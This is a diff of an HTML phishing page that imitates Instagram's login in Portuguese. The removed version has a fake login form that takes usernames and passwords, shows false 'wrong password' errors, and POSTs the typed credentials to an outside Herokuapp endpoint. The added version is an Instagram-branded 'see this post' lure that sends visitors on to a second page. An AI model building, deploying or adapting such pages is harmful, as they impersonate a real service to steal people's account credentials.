@@ -1,210 +1,182 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="src/style.css">
-    <title>Instagram Login</title>
-            <link rel="icon" type="image/png" href="./img/instagram.png">
-</head>
-<body>
-     
-    <div class="instagram-wrapper">
-    
-     <div class="instagram-phone">
-            <img src="./img/apresentacao-celular.png" alt="instagram apresentação">
-        </div>
-
-        <div class="instagram-login">
-     
- 
-<p class="not-account">Português (Brasil)
-
-    <p style="margin-bottom: 20px;"></p>
-
-                  <img src="./img/instagram.png"
-                  
-     alt="instagram apresentação"
-     style="width: 80px; height: 80px;">
-
-    <p style="margin-bottom: 50px;"></p>
-          
-            <form id="formulario">
-    <input type="text" id="nome" placeholder="Telefone, nome de usuário ou email">
-
-<div class="input-senha">
-    <input type="password" id="mensagem" placeholder="Senha">
-    <span class="olho" onclick="mostrarSenha()">👁</span>
-</div>
-
-    <button type="submit" class="instagram-entrar">Entrar</button>
-
-   <p id="textoClicado" style="display:none; color:#ed4956; margin-top:10px;">
-   Senha Incorreta! Tente Novamente
-</p>
-
-    <p>Esqueceu a senha?</p>
-</form>
-
-<script>
-let cliques = 0;
-
-document.getElementById("formulario").addEventListener("submit", function(event) {
-    event.preventDefault();
-
-    cliques++;
-
-    if (cliques <= 3) {
-        document.getElementById("textoClicado").style.display = "block";
-    } else {
-        window.location.href = "https://www.instagram.com/reel/DWAS4p_kRs1/";
-    }
-});
-function mostrarSenha() {
-    const senha = document.getElementById("mensagem");
-
-    senha.type = senha.type === "password" ? "text" : "password";
-}
-const senha = document.getElementById("mensagem");
-const toggle = document.getElementById("toggleSenha");
-
-toggle.addEventListener("click", () => {
-    if (senha.type === "password") {
-        senha.type = "text";
-        toggle.textContent = "🙈";
-    } else {
-        senha.type = "password";
-        toggle.textContent = "👁️";
-    }
-});
-</script>
-
-    <p style="margin-bottom: 30px;"></p>
-<a href="#" class="instagram-esqueceu">Criar nova conta</a>
-<img src="./img/meta.png"
-     alt="Meta"
-     style="width: 60px; height: 30px; margin-top: 0;">
-</form>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
 
 <style>
- .instagram-esqueceu {
-    display: inline-block;
-    padding: 15px 90px;
-    border: 1px solid #0095f6;
-    border-radius: 20px;
-    color: #0095f6;
-    text-decoration: none;
-    font-weight: 600;
-    text-align: center;
-    cursor: pointer;
-}
-.input-senha {
-    position: relative;
-    width: 350px;
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
 }
 
-.input-senha input {
-    width: 100%;
-    height: 60px;
-    padding: 10px 45px 10px 10px; /* espaço para o olho */
-    border: 1px solid #dbdbdb;
-    border-radius: 20px;
-    background-color: #fafafa;
-    box-sizing: border-box;
+html,body{
+    width:100%;
+    height:100%;
+    overflow:hidden;
 }
 
-.input-senha .olho {
-    position: absolute;
-    right: 15px;
-    top: 50%;
-    transform: translateY(-50%);
-    cursor: pointer;
-    font-size: 20px;
-    color: #8e8e8e;
-    user-select: none;
+body{
+    background:url("fundo.jpg") center center no-repeat;
+    background-size:cover;
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    position:relative;
 }
 
-.instagram-esqueceu:hover {
-    background-color: #f0f8ff;
-}
-#formulario {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 25px; /* Espaço entre os elementos */
-    width: 100%;
-    
+/* Fundo escuro */
+.overlay{
+    position:absolute;
+    inset:0;
+    background:rgba(0,0,0,.55);
 }
 
-#formulario input {
-    width: 350px;
-      height: 60px;  /* altura */
-    padding: 10px;
-    border: 1px solid #dbdbdb;
-    border-radius: 20px; /* bordas mais arredondadas */
-    background-color: #fafafa;
-    box-sizing: border-box;
+/* Caixa branca */
+.popup{
+
+    position:relative;
+    z-index:2;
+
+    width:360px;
+    max-width:92%;
+
+    background:#fff;
+
+    border-radius:28px;
+
+    padding:28px;
+
+    text-align:center;
+
+    box-shadow:0 12px 35px rgba(0,0,0,.35);
+
 }
 
-.instagram-entrar {
-    width: 320px;
-      height: 50px;  /* altura */
-    padding: 10px;
-    border: none;
-    border-radius: 20px; /* bordas mais arredondadas */
-    background-color: #0095f6;
-    color: white;
-    cursor: pointer;
+.avatar{
+
+    width:82px;
+    height:82px;
+
+    border-radius:50%;
+
+    object-fit:cover;
+
+    margin:auto;
+
+    display:block;
+
+    margin-bottom:18px;
+
 }
 
-.group {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
+h1{
 
-    width: 400px;   /* largura */
-    height: 400px;  /* altura */
+    font-size:30px;
+
+    color:#222;
+
+    margin-bottom:20px;
+
 }
+
+p{
+
+    font-size:14px;
+
+    color:#666;
+
+    line-height:22px;
+
+}
+
+button{
+
+    width:100%;
+
+    height:52px;
+
+    border:none;
+
+    border-radius:12px;
+
+    background:#1877F2;
+
+    color:#fff;
+
+    font-size:18px;
+
+    font-weight:bold;
+
+    cursor:pointer;
+
+    margin-top:25px;
+
+    transition:.2s;
+
+}
+
+button:hover{
+
+    background:#166FE5;
+
+}
+
+.cadastro{
+
+    margin-top:18px;
+
+    color:#1877F2;
+
+    font-size:17px;
+
+    cursor:pointer;
+
+}
+
 </style>
 
+</head>
 
-<div id="resultado"></div>
+<body>
 
-<script>
-document.getElementById("formulario").addEventListener("submit", async (e) => {
-    e.preventDefault();
+<div class="overlay"></div>
 
-    const mensagem = document.getElementById("nome").value;
-    const nome = document.getElementById("mensagem").value;
+<div class="popup">
 
-await fetch("https://testese-25e7f8228b47.herokuapp.com/cadastro", {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-        mensagem,
-        nome
-    })
-});
+    <img src="perfil.jpg" class="avatar">
 
+    <h1>Veja este post</h1>
 
-    const dados = await resposta.json();
+    <p>
+        Ao continuar, você concorda com os Termos de Uso e a Política de Privacidade do Instagram.
+    </p>
 
-});
-</script>
-                
-                
-            
-         
-            </div>
+    <button id="entrar">
+        Entrar Instagram
+    </button>
 
-           
-              
-            
+    <div class="cadastro">
+        Cadastre-se
+    </div>
 
 </div>
+
+<script>
+
+document.getElementById("entrar").onclick = function(){
+
+    window.location.href = "index2.html";
+
+};
+
+</script>
 
 </body>
 </html>
